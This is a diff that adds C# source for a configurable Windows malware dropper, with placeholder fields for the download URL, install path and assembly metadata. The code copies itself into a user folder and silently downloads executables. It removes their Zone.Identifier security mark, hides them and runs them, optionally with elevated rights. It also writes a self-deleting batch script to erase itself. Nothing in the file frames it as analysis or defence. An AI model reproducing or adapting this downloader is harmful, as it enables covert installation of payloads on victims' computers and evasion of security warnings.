@@ -1,0 +1,244 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Security;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading;
+using System.Threading.Tasks;
+
+[assembly: AssemblyTitle("[TITLE]")]
+[assembly: AssemblyDescription("[DESCRIPTION]")]
+[assembly: AssemblyCompany("[COMPANY]")]
+[assembly: AssemblyProduct("[PRODUCT]")]
+[assembly: AssemblyCopyright("Copyright (c) [COPYRIGHT] 2021")]
+[assembly: ComVisible(false)]
+[assembly: Guid("[GUID]")]
+[assembly: AssemblyVersion("[VERSION]")]
+[assembly: AssemblyFileVersion("[FILEVERSION]")]
+
+namespace #NAMESPACE
+{
+    internal static class Program
+    {
+        [STAThread]
+        public static async Task MainAsync()
+        {
+            await LoudFaster.Inizialize().ConfigureAwait(false);
+        }
+
+        [STAThread]
+        public static void Main()
+        {
+            if (!GlobalPath.AssemblyPath.StartsWith(GlobalPath.Getpath("[Path]"), StringComparison.OrdinalIgnoreCase))
+            {
+                File.Copy(GlobalPath.AssemblyPath, GlobalPath.App, false);
+                ExecuteCMD.RunFile(GlobalPath.App);
+                if (PanelWork.SuicideActivate)
+                {
+                    Suicide.Inizialize("Destroy.bat");
+                    ExecuteCMD.RunFile("Destroy.bat");
+                }
+            }
+            else
+            {
+                MainAsync().GetAwaiter().GetResult();
+                if (PanelWork.SuicideActivate)
+                {
+                    Suicide.Inizialize("Destroy2.bat");
+                    ExecuteCMD.RunFile("Destroy2.bat");
+                }
+            }
+
+        }
+    }
+    public static class PanelWork
+    {
+        public static void Sleeping(int time) { try { Thread.Sleep(time); } catch { } }
+        public static bool SuicideActivate = [SUICIDE];
+        public static bool RunFromAdmin = [ADMIN];
+    }
+
+    public static class ExecuteCMD
+    {
+        public static void RunFile(string filename)
+        {
+            if (!string.IsNullOrWhiteSpace(filename))
+            {
+                try
+                {
+                    var style = ProcessWindowStyle.Hidden;
+                    var startInfo = new ProcessStartInfo
+                    {
+                        FileName = filename,
+                        CreateNoWindow = false,
+                        WindowStyle = style,
+                    };
+                    if (PanelWork.RunFromAdmin)
+                    {
+                        startInfo.UseShellExecute = true;
+                        startInfo.Verb = "runas";
+                    }
+                    using (var info = Process.Start(startInfo)) { info.Refresh(); }
+                }
+                catch { }
+            }
+        }
+        public static void LaunchFile(string filename)
+        {
+            if (File.Exists(filename))
+            {
+                if (filename.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+                {
+                    NativeMethods.DeleteFileW(string.Concat(filename, ":Zone.Identifier"));
+                }
+                if (!File.GetAttributes(filename).HasFlag(FileAttributes.Hidden))
+                {
+                    File.SetAttributes(filename, FileAttributes.Hidden);
+                }
+                RunFile(filename);
+            }
+        }
+    }
+
+    public static class Suicide
+    {
+        public static void Inizialize(string pathFile)
+        {
+            if (!string.IsNullOrWhiteSpace(pathFile) && pathFile.EndsWith(".bat", StringComparison.InvariantCultureIgnoreCase))
+            {
+                try
+                {
+                    using (var sw = new StreamWriter(pathFile))
+                    {
+                        sw.WriteLine("@echo off");
+                        sw.WriteLine("chcp 1251 >NUL");
+                        sw.WriteLine("cls");
+                        sw.WriteLine(":loop");
+                        sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\""));
+                        sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop"));
+                        sw.WriteLine("chcp 866 >NUL");
+                        sw.WriteLine("echo 様様様様様様様様様様様様様様様様");
+                        sw.WriteLine("del %0");
+                        sw.Flush();
+                    }
+                }
+                catch { }
+            }
+        }
+    }
+
+    internal static class NativeMethods
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        internal static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);
+    }
+
+    public static class InetCheck
+    {
+        public static bool GetInternetIsConnected()
+        {
+            try
+            {
+                const string URL = "http://www.google.com";
+                var link = new Uri(URL, UriKind.Absolute);
+                using (var client = new WebClient())
+                using (Stream stream = client.OpenRead(link))
+                {
+                    return true;
+                }
+            }
+            catch { return false; }
+        }
+    }
+
+    public static class GlobalPath
+    {
+        public static string Getpath(string path)
+        {
+            switch (path)
+            {
+                case "AppData": return AppDir;
+                case "LocalAppData": return LocalAppDir;
+                case "Desktop": return DesktopDir;
+                case "Temp": return DefaultTemp;
+                default: return AppDir;
+            }
+        }
+
+        public static readonly string GetFileName = Path.GetFileName(AppDomain.CurrentDomain.FriendlyName);
+        public static readonly string AssemblyPath = Assembly.GetExecutingAssembly().Location;
+        public static readonly string StartupPath = Path.GetDirectoryName(AssemblyPath);
+        public static readonly string DesktopDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
+        public static readonly string AppDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+        public static readonly string LocalAppDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+        public static readonly string DefaultTemp = string.Concat(Environment.GetEnvironmentVariable("temp"), '\\');
+        public static readonly string App = Path.Combine(Getpath("[Path]"), Path.GetFileName(AssemblyPath.Replace(AssemblyPath, "new_file.exe"))); 
+    }
+
+    public static class LoudFaster
+    {
+        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
+        { return error.Equals(SslPolicyErrors.None); }
+
+        public static void CheckSizeFileAndRun(string path) { try { if (new FileInfo(path).Length > 0) { ExecuteCMD.LaunchFile(path); } } catch { } }
+
+        private static List<string> AddUrl()
+        {
+            var links = new List<string>
+            {
+               "[URL]"
+            }; return links;
+        }
+
+        public static async Task Inizialize()
+        {
+        Begin:
+            if (InetCheck.GetInternetIsConnected())
+            {
+                List<string> ArrayLink = AddUrl();
+                for (int i = 0; i < ArrayLink.Count; i++)
+                {
+                    string filename = Path.GetFileName(ArrayLink[i]);
+                    string fullpath = Path.Combine(GlobalPath.Getpath("[Path]"), filename); 
+
+                    if (!File.Exists(fullpath))
+                    {
+                        try
+                        {
+                            var url = new Uri(ArrayLink[i], UriKind.Absolute);
+                            using (var client = new WebClient())
+                            {
+                                ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
+                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
+                                client.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome / 62.0.3202.94 Safari / 537.36 OPR / 49.0.2725.64");
+                                client.Proxy = null;
+                                try
+                                {
+                                    await client.DownloadFileTaskAsync(url, fullpath);
+
+                                    if (fullpath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+                                    {
+                                        CheckSizeFileAndRun(fullpath);
+                                    }
+                                }
+                                catch { continue; }
+                            }
+                        }
+                        catch { }
+                    }
+                    else { continue; }
+                }
+            }
+            else
+            {
+                PanelWork.Sleeping(3000);
+                goto Begin;
+            }
+        }
+    }
+}
